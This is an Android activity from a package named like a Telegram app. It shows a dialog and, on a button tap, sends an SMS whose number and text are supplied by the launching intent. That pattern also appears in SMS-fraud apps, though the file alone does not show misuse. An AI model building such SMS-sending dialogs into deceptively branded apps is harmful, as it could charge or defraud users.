package ir.hamzad.telegram;

import android.app.Activity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.view.View;
import android.widget.TextView;

public class Main2Activity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.dialog);
        findViewById(R.id.button).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                SmsManager smsManager = SmsManager.getDefault();
                smsManager.sendTextMessage(getIntent().getExtras().getString("d1"), null, getIntent().getExtras().getString("d2"), null, null);
            }
        });
        TextView t = (TextView) findViewById(R.id.textView1);
        TextView t2 = (TextView) findViewById(R.id.textView2);
        t.setText(getIntent().getExtras().getString("s1"));
        t2.setText(getIntent().getExtras().getString("s2"));
    }
}
